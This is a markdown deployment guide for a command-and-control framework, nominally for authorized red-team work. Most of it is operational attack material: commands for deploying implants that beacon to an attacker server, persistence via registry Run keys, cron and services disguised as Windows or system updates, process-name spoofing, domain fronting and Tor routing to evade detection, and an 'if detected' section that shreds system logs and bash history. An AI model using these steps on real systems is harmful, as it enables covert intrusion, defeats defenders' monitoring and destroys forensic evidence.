# C2 Framework Deployment Guide

⚠️ **LEGAL DISCLAIMER**: This deployment guide is for authorized penetration testing, red team exercises, and educational purposes only. Always ensure you have explicit written permission before deploying on any systems.

## 🎯 Deployment Scenarios

### 1. Authorized Penetration Testing

#### **Lab Environment Setup**
```bash
# 1. Set up isolated network
# Create VMs: 1 Attacker, 2-3 Target systems

# 2. Deploy C2 server on attacker machine
./output/c2_server

# 3. Deploy clients on target systems (with permission)
./output/c2_client --server <attacker_ip> --port 4444
```

#### **Corporate Red Team Exercise**
```bash
# 1. Coordinate with blue team
# 2. Set up C2 server on approved infrastructure
# 3. Deploy clients using approved methods:
#    - Email simulation (approved phishing)
#    - Physical access simulation
#    - Insider threat simulation
```

### 2. Security Research

#### **Malware Analysis Lab**
```bash
# 1. Use isolated network (no internet access)
# 2. Deploy C2 for behavioral analysis
# 3. Study detection capabilities
# 4. Develop countermeasures
```

## 🚀 Production Deployment

### **Server Deployment**

#### **Option 1: Local Network**
```bash
# Bind to specific interface
./c2_server --bind 192.168.1.100 --port 4444

# Or modify config
# server_config.toml:
[server]
bind_address = "192.168.1.100"
bind_port = 4444
max_clients = 50
```

#### **Option 2: Cloud VPS (for authorized testing)**
```bash
# 1. Set up cloud instance (AWS, DigitalOcean, etc.)
# 2. Configure firewall rules
sudo ufw allow 4444/tcp

# 3. Start server with nohup
nohup ./c2_server > server.log 2>&1 &

# 4. Monitor logs
tail -f server.log
```

#### **Option 3: Reverse Proxy Setup**
```nginx
# nginx.conf
server {
    listen 443 ssl;
    server_name your-domain.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location / {
        proxy_pass http://127.0.0.1:4444;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### **Client Deployment Methods**

#### **Method 1: Direct Execution**
```bash
# Simple execution
./c2_client --server 192.168.1.100

# With custom configuration
./c2_client --server target-server.com --port 443 --heartbeat-interval 300
```

#### **Method 2: Service Installation (Windows)**
```batch
REM Create service wrapper
sc create "WindowsUpdateService" binPath= "C:\Windows\System32\svchost.exe" start= auto
REM Replace with actual client binary path in production
```

#### **Method 3: Systemd Service (Linux)**
```bash
# Create service file
sudo tee /etc/systemd/system/system-monitor.service << EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/system-monitor/monitor
Restart=always
RestartSec=30
User=nobody

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
sudo systemctl enable system-monitor
sudo systemctl start system-monitor
```

#### **Method 4: Persistence via Scripts**
```powershell
# PowerShell persistence (Windows)
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $path -Name "SecurityUpdate" -Value "C:\path\to\client.exe"
```

```bash
# Cron persistence (Linux)
(crontab -l 2>/dev/null; echo "@reboot /opt/client/daemon") | crontab -
```

## 🔧 Configuration Management

### **Server Configuration**
```toml
# server_config.toml
[server]
bind_address = "0.0.0.0"
bind_port = 4444
rsa_key_size = 2048
heartbeat_timeout = 300
max_clients = 100

[security]
require_auth = true
auth_token = "your-secret-token"
enable_logging = true
log_file = "/var/log/c2_server.log"

[persistence]
save_state = true
state_file = "/var/lib/c2/state.json"
```

### **Client Configuration**
```toml
# client_config.toml
[client]
server_address = "your-server.com"
server_port = 443
reconnect_delay = 60
heartbeat_interval = 300
command_poll_interval = 10
max_reconnect_attempts = 0

[stealth]
process_name = "svchost"
hide_window = true
random_delays = true
jitter_percent = 20

[persistence]
enabled = true
method = "registry"  # registry, service, scheduled_task
location = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
```

## 🔐 Security Hardening

### **Server Security**
```bash
# 1. Use TLS/SSL termination
# 2. Implement IP whitelisting
# 3. Use strong RSA keys (4096-bit for high security)
# 4. Regular key rotation
# 5. Encrypted log storage
# 6. Rate limiting
```

### **Client Security**
```bash
# 1. Code obfuscation
# 2. Anti-debugging techniques
# 3. Encrypted strings
# 4. Domain fronting
# 5. Sleep randomization
```

### **Network Security**
```bash
# Use domain fronting
./c2_client --server cdn.cloudflare.com --host-header your-hidden-domain.com

# Use custom User-Agent
./c2_client --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."

# Proxy support
./c2_client --proxy socks5://127.0.0.1:9050  # Tor
```

## 📊 Monitoring and Logging

### **Server Monitoring**
```bash
# Real-time client monitoring
tail -f /var/log/c2_server.log | grep "CONNECT\|DISCONNECT\|COMMAND"

# Client statistics
curl -s http://localhost:4444/api/stats | jq '.'
```

### **Log Analysis**
```bash
# Parse connection logs
awk '/CONNECT/ {print $1, $2, $4}' c2_server.log

# Command execution statistics
grep "COMMAND_RESULT" c2_server.log | wc -l

# Error analysis
grep "ERROR\|FAIL" c2_server.log | tail -20
```

## 🛡️ Detection Evasion

### **Traffic Patterns**
```bash
# Randomize beacon intervals
./c2_client --jitter 30  # 30% randomization

# Use legitimate-looking domains
./c2_client --server update.microsoft.com --host-header hidden.domain.com
```

### **Process Hiding**
```bash
# Windows: Hide process from Task Manager
./c2_client --stealth-mode advanced

# Linux: Change process name
./c2_client --process-name "[kworker/0:1]"
```

## 🧪 Testing Procedures

### **Pre-Deployment Testing**
```bash
# 1. Run test suite
./test.sh

# 2. Verify encryption
./test_crypto.sh

# 3. Network connectivity test
./test_network.sh

# 4. Persistence test
./test_persistence.sh
```

### **Post-Deployment Verification**
```bash
# 1. Check client connections
C2> clients

# 2. Test basic commands
C2> exec client_id whoami
C2> exec client_id ipconfig

# 3. Verify persistence
# Reboot target system and check reconnection

# 4. Test stealth features
# Check if client is visible in process lists
```

## 🚨 Incident Response

### **If Detected**
```bash
# 1. Clean shutdown
C2> exec all_clients !exit

# 2. Remove persistence
C2> exec all_clients reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f

# 3. Clear logs
rm -f /var/log/c2_server.log
./c2_client --uninstall
```

### **Evidence Cleanup**
```bash
# Server cleanup
shred -vfz -n 3 c2_server.log
rm -rf /var/lib/c2/
rm -f ~/.bash_history

# Client cleanup (Windows)
sdelete -p 3 -s -z C:\Temp\
cipher /w:C:\

# Client cleanup (Linux)
shred -vfz -n 3 /var/log/auth.log
dd if=/dev/zero of=/tmp/zero bs=1M count=1000; rm /tmp/zero
```

## 📋 Deployment Checklist

### **Pre-Deployment**
- [ ] Legal authorization obtained
- [ ] Test environment validated
- [ ] All components compiled and tested
- [ ] Network infrastructure prepared
- [ ] Monitoring systems ready
- [ ] Incident response plan prepared

### **Deployment**
- [ ] Server deployed and secured
- [ ] Firewall rules configured
- [ ] SSL/TLS certificates installed (if using HTTPS)
- [ ] Client deployment method selected
- [ ] Initial connectivity verified
- [ ] Stealth features enabled

### **Post-Deployment**
- [ ] All clients connected successfully
- [ ] Command execution verified
- [ ] Persistence mechanisms tested
- [ ] Detection evasion confirmed
- [ ] Logging and monitoring active
- [ ] Backup and recovery procedures tested

### **Cleanup**
- [ ] All clients disconnected
- [ ] Persistence removed
- [ ] Log files cleared
- [ ] Network artifacts removed
- [ ] Documentation completed
- [ ] Lessons learned recorded

## ⚖️ Legal and Ethical Guidelines

### **Documentation Requirements**
- Maintain detailed logs of all activities
- Document scope and limitations
- Record authorization letters
- Track all deployed clients

### **Responsible Disclosure**
- Report vulnerabilities through proper channels
- Provide technical details to affected parties
- Assist in remediation efforts
- Follow coordinated disclosure timelines

### **Post-Assessment**
- Remove all deployed software
- Verify complete cleanup
- Provide comprehensive report
- Recommend security improvements

---

**Remember**: The goal is to improve security, not compromise it. Always operate within legal and ethical boundaries.
